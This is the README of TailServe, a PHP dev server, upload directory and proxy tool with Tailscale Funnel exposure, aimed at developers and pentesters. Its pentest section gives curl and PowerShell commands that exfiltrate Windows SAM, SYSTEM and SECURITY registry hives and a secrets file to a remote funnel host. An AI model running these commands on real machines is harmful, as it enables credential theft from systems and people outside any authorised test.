# TailServe

Single‑file tool to run a PHP dev server, browsable directory, or reverse proxy. Optional exposure via Tailscale Funnel. Built for rapid development and pentesting.

<img width="1333" height="672" alt="image" src="https://github.com/user-attachments/assets/ce80dc81-b146-4c0b-bcb4-d964b0482e30" />

## What it is

* Distributed as a single python script named `tailserve`. Place it in your PATH and run `tailserve`.
* Wraps PHP's built‑in server with a hardened router and structured logging.
* Modes: index (default), spa, api, all404, directory, proxy.

## Dependencies

* PHP CLI 8.1+ in PATH
* **php-curl extension** (required for proxy mode only): `sudo apt install php-curl`
* Linux/macOS shell
* Optional: Tailscale installed and logged in for `--funnel`

## Install

```bash
git clone https://github.com/0xP1ckl3d/TailServe.git
cd TailServe
chmod +x tailserve
sudo mv tailserve /usr/local/bin/
```

Verify PATH then run:

```bash
tailserve -h
```

## Behaviour and defaults

* `tailserve` without flags serves the current directory and tries to host `index.php` if it exists.
* If `index.php` is absent, `/` returns 404. Files are served by direct path only. No directory listing unless directory mode is enabled.

## Quick starts

Serve current directory as a PHP app (index mode):

```bash
tailserve
```

Serve a specific directory and port:

```bash
tailserve -d /path/to/site -p 3000
```

Directory mode (browsable UI + upload/download/delete):

```bash
tailserve -D
# equivalent to: tailserve -m directory
```

SPA routing to index.php for non‑file requests:

```bash
tailserve -m spa -d /path/to/app
```

API mode (JSON 404 for unknown endpoints):

```bash
tailserve -m api
```

Force 404 template for every request:

```bash
tailserve -m all404
```

## Proxy mode

Forward all requests to an upstream server. Useful for local testing, adding authentication to services, or debugging API traffic.

**Basic usage:**

```bash
# Proxy to example.com
tailserve -P https://example.com

# Proxy with custom port
tailserve -p 9000 -P https://api.internal.com

# Proxy with authentication
tailserve -P https://backend.service.com -a admin:secret
```

**With Tailscale Funnel:**

```bash
# Expose internal service to the internet
tailserve -f -P http://localhost:3000
```

**Limitations:**

Proxy mode works well for:
- Simple websites with relative URLs
- REST APIs and JSON endpoints
- Internal tools and services

Proxy mode has limitations with:
- Complex JavaScript-heavy sites (Google, Facebook, etc.)
- Sites with absolute URLs in HTML/CSS/JavaScript
- WebSocket connections
- Sites with strict CSP or CORS policies

The proxy automatically:
- Rewrites `Location` headers for redirects
- Handles compressed responses (gzip/deflate)
- Forwards request/response headers
- Preserves cookies and authentication

**Options:**

```bash
-P, --proxy URL              Target URL to proxy (e.g., https://api.example.com)
    --proxy-preserve-host    Keep original Host header (for virtual hosts)
```

## Authentication

Enable HTTP Basic Auth:

```bash
tailserve -D -a admin:'P@ssw0rd'
```

## Tailscale Funnel

Expose the server publicly. Requires `tailscale up` and Funnel enabled on your tailnet.

```bash
tailserve -p 8000 -f
```

Stop Funnel:

```bash
sudo tailscale funnel off
```

<img width="1085" height="497" alt="image" src="https://github.com/user-attachments/assets/bd342f97-2a22-4824-a747-293189a9e907" />

## Logging

* Colourised structured logs to stderr
* Optional file logging with verbose levels

**Basic logging:**

```bash
tailserve -l /var/log/tailserve.log
```

**Verbose logging levels** (only applies when using `-l` for file logging):

```bash
# Level 1 (-v): Log all request/response headers
tailserve -l app.log -v -P https://api.example.com

# Level 2 (-vv): Log headers + request/response bodies (first 1000 chars)
tailserve -l app.log -vv -P https://api.example.com
```

Verbose output only goes to the log file, keeping console output clean while providing detailed debugging information for troubleshooting proxy issues, API debugging, or security analysis.

![Router log output](docs/img/placeholder-cli-logs.png)

## Security controls

* Basic auth via `-a USER:PASS`
* Security headers on by default; disable with `--no-security-headers`
* `realpath` containment to block traversal
* Optional per‑IP rate limiting

Examples:

```bash
# limit to 120 req/min/IP
tailserve -r 120

# enable CORS to a dev frontend
tailserve -C --cors-origins http://localhost:5173
```

## Custom 404 and SPA

Custom 404 template within docroot:

```bash
tailserve --custom-404 errors/404.html
```

SPA with CORS allow‑list:

```bash
tailserve -m spa -C --cors-origins http://localhost:3000
```

<img width="1092" height="739" alt="image" src="https://github.com/user-attachments/assets/6046e846-0877-4eb4-8145-2e6695de13bb" />

## File uploads (directory mode)

* Upload cap: `--max-upload` (default 1G)
* Read timeout: `--upload-timeout` seconds (default 600)

```bash
tailserve -D --max-upload 2G --upload-timeout 900
```

## Practical usage during a pentest

**Upload data from target machine to password protected funnel from PowerShell:**

```powershell
# Using curl exfiltrate SAM, SYSTEM & SECURITY registry hives
curl.exe -u admin:admin1234 -F "files[]=@SAM" -F "files[]=@SYSTEM" -F "files[]=@SECURITY" "https://host.tailnet.ts.net/?upload=1"

# Using PowerShell exfiltrate secrets file
Add-Type -AssemblyName System.Net.Http;$u="admin";$p="admin1234";$f="secrets.txt";$url="https://host.tailnet.ts.net/?upload=1";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$u`:$p"));$c=New-Object System.Net.Http.HttpClient;$m=New-Object System.Net.Http.MultipartFormDataContent;$s=New-Object System.Net.Http.StreamContent([IO.File]::OpenRead($f));$m.Add($s,"files[]",[IO.Path]::GetFileName($f));$c.DefaultRequestHeaders.Authorization=New-Object System.Net.Http.Headers.AuthenticationHeaderValue("Basic",$b);($c.PostAsync($url,$m).Result).Content.ReadAsStringAsync().Result
```

**Debug API traffic during testing:**

```bash
# Proxy API with full request/response logging
tailserve -l api-debug.log -vv -P https://target-api.com -a tester:pass123
```

**Add authentication to unauthenticated internal service:**

```bash
# Wrap internal tool with basic auth
tailserve -P http://internal-tool:8080 -a admin:secure123 -f
```

## Health check

`GET /_tailserve/health` returns a minimal JSON body for monitoring.

```json
{"status":"ok","timestamp":"..."}
```

## Flags overview

```text
Server Configuration:
  -p, --port PORT              Port (default 8000)
  -H, --host HOST              Bind address (default 0.0.0.0)
  -d, --directory DIR          Document root (default cwd)
  -i, --index FILE             Index file (default index.php)

Routing & Content:
  -m, --mode MODE              index | spa | api | all404 | directory
  -D, --serve-directory        Shortcut for directory mode
      --custom-404 PATH        Custom 404 page template

Proxy Configuration:
  -P, --proxy URL              Enable proxy mode to target URL
      --proxy-preserve-host    Preserve Host header when proxying

Authentication & Security:
  -a, --auth USER:PASS         Basic auth
      --no-security-headers    Disable hardened headers
  -r, --rate-limit N           Requests per minute per IP
      --bind-localhost-only    Bind to 127.0.0.1 only

CORS Configuration:
  -C, --cors                   Enable CORS
      --cors-origins ORIGINS   Comma‑separated allow‑list

Logging & Output:
  -l, --log-file PATH          Log to file (no ANSI)
  -v, --verbose                Verbose file logging (-v=headers, -vv=headers+bodies)
      --colour MODE            auto | always | never
  -q, --quiet                  Less output

Advanced Options:
      --no-cache-static        Disable static caching
      --max-upload SIZE        e.g. 200M, 2G (default 1G)
      --upload-timeout SEC     Max input time (default 600)
  -c, --config PATH            Load JSON config
  -f, --funnel                 Enable Tailscale Funnel
      --version                Show version
```

## Notes

* Use in isolated labs when testing. For production, place behind a real web server.
* Keep auth and rate limit on when exposing via Funnel where practical.
* In directory mode, all users can upload, download, and delete files without restriction. If exposing over Funnel, only use with non-sensitive content and always enable strong authentication.
* Proxy mode requires php-curl extension. Simple proxying works well for APIs and basic sites, but complex JavaScript applications may have limitations.

## Licence

MIT.
